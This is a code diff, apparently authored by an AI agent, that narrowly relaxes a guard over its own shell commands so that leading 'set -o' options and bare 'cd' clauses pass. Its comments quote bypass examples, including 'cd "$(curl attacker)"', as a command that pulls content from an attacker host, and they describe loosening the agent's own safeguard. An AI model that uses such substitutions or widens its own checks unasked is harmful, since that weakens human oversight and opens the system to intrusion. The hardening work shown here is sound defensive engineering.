@@ -72,6 +72,63 @@ from divineos.core.command_parsing import CD, strip_prefixes_raw
 _CHAIN_SHAPE_METACHARS: tuple[str, ...] = (";", "&&", "||", "`", "$(")
 
 
+# A leading shell-option setting is ENVIRONMENT, not action -- the same class as
+# a leading directory change, which this gate has stripped for months.
+#
+# WHY IT IS HERE. Andrew, 2026-09-12, told me to go count the red marks across
+# the session and automate what could be automated. The count was 216 refused
+# tool calls, and inside it a class I had been filing as five separate
+# incidents: a guard refusing the exact command its own message prescribed.
+# Controlled test, before a line was written --
+#
+#     ALLOW   divineos ask "x"
+#     ALLOW   cd "<repo>" && divineos ask "x" | head -30
+#     BLOCK   cd "<repo>" && set -o pipefail && divineos ask "x"
+#
+# The break is the pipefail line, and another hook is what tells me to add it:
+# pipeline-exit-ambiguity.sh fires on any pipe and warns that a failure hides
+# behind a successful tail. It is right -- that shape once had me reporting a
+# blocked push as landed. So one guard's correct advice was welding shut every
+# other guard's escape hatch, and neither mechanism was ever in my head at the
+# same moment as the other, which is why five fires produced five local
+# explanations and no shared cause.
+#
+# Diagnosed as a class on 2026-08-04 in docs/channels_the_gates_named.md, item
+# 7, ranked highest-leverage on a ten-item list. The pipe and leading-cd
+# variants were fixed; this one was not, and nothing on that list shipped.
+#
+# NARROW BY CONSTRUCTION, per Schneier on the walk: whatever is stripped is
+# discarded from the safety check, so every admitted prefix is somewhere to
+# hide a payload -- and this gate has already been burned there once, when a
+# liberal shared stripper let two chained commands be treated as one. A shell
+# option is safe to admit precisely because its grammar is closed: the word
+# set, a dash-letter run or -o, one option name, nothing an attacker supplies.
+# Matched by exact pattern rather than stripped-until-something-fits, and an
+# unrecognised prefix means no exemption rather than a guess.
+_SHELL_OPTION_SEGMENT = re.compile(r"^set\s+(?:[+-][a-zA-Z]+|[+-]o\s+[a-zA-Z]+)$")
+
+# A ceiling, because "strip while it looks strippable" is the liberal shape the
+# walk refused. Two covers every real invocation I have ever written.
+_MAX_OPTION_PREFIXES = 2
+
+
+def strip_leading_shell_options(cmd: str) -> str:
+    """Command with leading `set -o ...` style segments removed.
+
+    Only leading ones, only joined by ``&&``, only the closed grammar above.
+    A shell option AFTER the remedy is an appended chain and stays refused.
+    """
+    out = cmd.strip()
+    for _ in range(_MAX_OPTION_PREFIXES):
+        head, sep, tail = out.partition("&&")
+        if not sep:
+            return out
+        if not _SHELL_OPTION_SEGMENT.match(head.strip()):
+            return out
+        out = tail.strip()
+    return out
+
+
 def _strip_shell_quoted(cmd: str) -> str:
     """Return cmd with the CONTENT of quoted regions replaced by 'Q',
     preserving the outside-quotes structure intact.
@@ -266,6 +323,24 @@ def _is_safe_remedy_invocation(cmd: str, allowed_heads: tuple[str, ...]) -> bool
             return False
         if any(ch in head for ch in _UNSAFE_IN_DISCARDED_PREFIX):
             return False
+
+    # Environment before action, per Dijkstra on the 2026-09-12 walk: a leading
+    # directory change is stripped above and a leading shell option is the same
+    # class. It happens HERE, after the discarded-prefix scrutiny above, and
+    # the ordering is not cosmetic -- doing it first made that check read my own
+    # removal as an appended chain and refuse every command it was meant to
+    # allow. The test table caught that before it shipped.
+    #
+    # The narrowness lives in this gate rather than in the shared stripper,
+    # because other callers want the liberal reading and this one must never
+    # have it -- the same conclusion the 2026-08-24 merge reached the hard way.
+    without_options = strip_leading_shell_options(real)
+    if without_options != real:
+        removed = real[: len(real) - len(without_options)]
+        if any(ch in removed for ch in ("`", "$(", "|", ">", "<", ";")):
+            return False
+        real = without_options
+
     # Split on pipe once — remedy must be the first pipeline segment.
     head_segment = re.split(r"\|", real, maxsplit=1)[0].strip()
     if not any(head_segment.startswith(h) for h in allowed_heads):
@@ -1078,6 +1153,14 @@ def _is_readonly_divineos_verb(cmd: str) -> bool:
 # the pattern -- the same distinction the whole day has been about.
 _SHELL_OPTION_ONLY = re.compile(r"set(?:\s+(?:[+-][A-Za-z]+|[a-z][a-z_]*))+\s*")
 
+# A clause that is a `cd` and a path and nothing else. SHAPE only -- the
+# dangerous characters are refused separately by membership against
+# _UNSAFE_IN_DISCARDED_PREFIX, which is already hardened and already the tuple
+# every other cd decision in this file is made against. Two checks rather than
+# one clever pattern, because the clever pattern is what let `cd "$(curl
+# attacker)"` through once before.
+_CD_ONLY_CLAUSE = re.compile(r"\s*cd\s+(?:\"[^\"]*\"|'[^']*'|\S+)\s*")
+
 
 def _split_shell_clauses(cmd: str) -> list[str]:
     """Split on real clause joiners, ignoring ones inside quotes.
@@ -1180,6 +1263,46 @@ def _is_readonly_probe(cmd: str) -> bool:
         # no operands beyond flags, and no assignment or redirection. Anything
         # that could name a file or a variable is not this.
         if _SHELL_OPTION_ONLY.fullmatch(clause):
+            return True
+        # AND A BARE `cd` IS THE SAME KIND OF NOTHING (2026-09-13).
+        #
+        # The argument three comments up was written for `set -o` and then asked
+        # of nothing else, which is the failure its own docstring describes one
+        # paragraph earlier: "the first repair opened one door and never swept
+        # the class." It happened again here, and the door it missed locked me
+        # out of this gate's evidence for several minutes while I mis-diagnosed
+        # the gate as a trapped key. Measured before believing:
+        #
+        #     divineos prereg overdue                   -> probe
+        #     set -o pipefail; divineos prereg overdue  -> probe
+        #     cd "<repo>"; divineos prereg overdue      -> BLOCKED
+        #
+        # A standalone `cd` clause has its prefix stripped, leaves the empty
+        # string, and empty reads as not-a-probe. But a cd changes this shell's
+        # working directory and touches no file, no store and no remote -- the
+        # identical inertness argument, and the cd is the habit half this house
+        # types on every single Bash call.
+        #
+        # THE PROPERTY, stated so the next gap is visible before it bites: a
+        # line is a probe when every clause either LOOKS and changes nothing, or
+        # DOES NOTHING AT ALL. Two clause kinds; the second had one member and
+        # needed two.
+        #
+        # NARROW ON PURPOSE, because loosening a cd check is how a gate gets
+        # laundered and this house has the worked examples: `cd "$(curl
+        # attacker)" && <remedy>`, `cd /a && cd /b && divineos correction`, and
+        # `cd /tmp>out && ...`. The shared parser accepted the last two; the
+        # letter recording that says narrowness was restored AT THE GATE and
+        # must stay here. So membership is asked of the existing hardened tuple
+        # rather than a fourth cd matcher being invented -- substitution,
+        # redirection, joiners and parens are refused whether quoted or not.
+        #
+        # NOT generalised to inert-commands-as-a-category. `export`, `umask`,
+        # `alias` and `trap` all look inert and are not. Two named inert things,
+        # each argued on its own, is the honest size of this.
+        if _CD_ONLY_CLAUSE.fullmatch(clause) and not any(
+            ch in clause for ch in _UNSAFE_IN_DISCARDED_PREFIX
+        ):
             return True
         return clause.startswith(_READONLY_PROBE_PREFIXES) or _is_readonly_divineos_verb(clause)
 
